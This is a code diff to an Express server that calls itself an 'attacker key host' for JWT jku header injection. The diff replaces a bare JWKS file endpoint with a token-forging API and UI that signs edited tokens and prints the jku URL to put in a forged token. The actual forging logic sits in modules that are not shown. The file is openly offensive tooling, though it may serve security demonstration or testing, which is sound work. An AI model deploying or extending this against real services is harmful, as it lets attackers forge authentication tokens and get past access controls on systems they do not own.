@@ -1,27 +1,26 @@
 import express from 'express';
-import * as fs from 'fs';
 import * as path from 'path';
+import forgeRoutes from './routes/api';
+import { getJkuUrl } from './sign';
 
 const app = express();
 const port = process.env.PORT || 3006;
-const JWKS_PATH = path.join(__dirname, '..', 'keys', 'jwks.json');
+// Serves both the forge UI (paste a token, edit its payload, sign a new one)
+// and the same keys/public folder that could otherwise be published as a
+// static site on its own. Deploying this as a real service (rather than a
+// static site) is a deliberate choice - it's what makes /api/forge usable
+// remotely, at the cost of the private key living on this instance and the
+// signing endpoint being reachable by anyone with the URL.
+const UI_DIR = path.join(__dirname, '..', 'src', 'public');
+const KEYS_PUBLIC_DIR = path.join(__dirname, '..', 'keys', 'public');
 
-// This is the entire "attack infrastructure": a JSON file, served over HTTP.
-// Any server that fetches a jku URL without checking whether it's allowed to
-// trust that host will happily come here and pick up whatever key we put in it.
-app.get('/.well-known/jwks.json', (req, res) => {
-  if (!fs.existsSync(JWKS_PATH)) {
-    return res.status(404).json({ error: 'No keys generated yet - run `npm run generate-keys` first.' });
-  }
-  res.sendFile(JWKS_PATH);
-});
-
-app.get('/', (req, res) => {
-  res.send('Attacker-controlled key host. Keys served at /.well-known/jwks.json');
-});
+app.use(express.json());
+app.use('/api', forgeRoutes);
+app.use(express.static(UI_DIR));
+app.use(express.static(KEYS_PUBLIC_DIR));
 
 app.listen(port, () => {
   console.log(`Attacker key host listening on port ${port}`);
-  const jkuBase = process.env.JKU_BASE_URL || `http://localhost:${port}`;
-  console.log(`jku URL to use in a forged token: ${jkuBase}/.well-known/jwks.json`);
+  console.log(`Forge UI: http://localhost:${port}`);
+  console.log(`jku URL to use in a forged token: ${getJkuUrl()}`);
 });
